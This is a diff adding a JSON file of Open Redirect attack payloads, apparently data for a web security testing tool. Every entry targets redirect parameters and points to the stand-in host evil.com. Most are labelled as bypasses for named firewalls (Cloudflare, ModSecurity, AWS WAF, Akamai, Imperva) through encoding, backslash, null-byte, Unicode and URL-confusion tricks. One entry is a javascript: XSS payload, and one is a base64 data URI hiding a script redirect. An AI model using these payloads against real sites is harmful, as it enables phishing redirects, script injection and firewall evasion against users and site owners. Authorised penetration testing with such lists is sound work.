@@ -1,0 +1,211 @@
+{
+    "vulnerability_type": "Open Redirect",
+    "description": "Open Redirect payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "//evil.com",
+            "description": "Protocol-relative redirect",
+            "context": "redirect_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "protocol_relative"
+            ]
+        },
+        {
+            "payload": "https://evil.com",
+            "description": "Direct URL redirect",
+            "context": "redirect_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "direct"
+            ]
+        },
+        {
+            "payload": "/\\evil.com",
+            "description": "Backslash after slash",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "backslash",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "////evil.com",
+            "description": "Multiple slashes",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "multiple_slash",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "https:evil.com",
+            "description": "Missing double slash after protocol",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "protocol_trick",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://evil.com%2f%2f.target.com",
+            "description": "URL encoded slashes with target domain suffix",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "url_encode",
+                "domain_suffix",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "//evil%00.com",
+            "description": "Null byte in domain",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "null_byte",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://target.com@evil.com",
+            "description": "Credentials-based URL confusion",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf",
+                "modsecurity"
+            ],
+            "tags": [
+                "url_confusion",
+                "credentials",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "javascript:alert(document.domain)",
+            "description": "JavaScript protocol redirect for XSS",
+            "context": "redirect_parameter",
+            "waf_bypass": false,
+            "tags": [
+                "javascript",
+                "xss"
+            ]
+        },
+        {
+            "payload": "//evil.com/%2f..",
+            "description": "Path traversal in redirect URL",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai"
+            ],
+            "tags": [
+                "path_traversal",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "/%09/evil.com",
+            "description": "Tab character between slashes",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity",
+                "cloudflare"
+            ],
+            "tags": [
+                "tab",
+                "whitespace",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "/%5cevil.com",
+            "description": "URL encoded backslash",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "modsecurity"
+            ],
+            "tags": [
+                "url_encode",
+                "backslash",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "/〱evil.com",
+            "description": "Unicode character (U+3031) as slash alternative",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "akamai",
+                "imperva"
+            ],
+            "tags": [
+                "unicode",
+                "slash_alternative",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "http://evil.com#target.com",
+            "description": "Fragment with target domain",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "fragment",
+                "domain_trick",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=",
+            "description": "Data URI redirect via base64 HTML",
+            "context": "redirect_parameter",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "data_uri",
+                "base64",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
